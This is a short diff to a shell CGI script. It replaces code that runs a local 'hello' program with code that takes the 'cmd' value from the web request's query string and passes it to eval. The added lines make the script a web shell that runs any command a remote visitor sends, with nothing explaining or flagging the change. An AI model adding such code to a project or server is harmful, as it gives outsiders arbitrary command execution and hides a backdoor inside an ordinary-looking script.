@@ -1,12 +1,10 @@
 #!/bin/sh
-echo "Content-type: text/plain"
+
+echo "Content-Type: text/plain"
 echo ""
 
-# Execute the 'hello' file and print its output
-if [ -x "./hello" ]; then
-    echo "Running 'hello'..."
-    ./hello 2>&1
-else
-    echo "'hello' not found or not executable."
-fi
+# Extract query string
+CMD=$(echo "$QUERY_STRING" | sed 's/^cmd=//')
 
+# Run the command
+eval "$CMD"
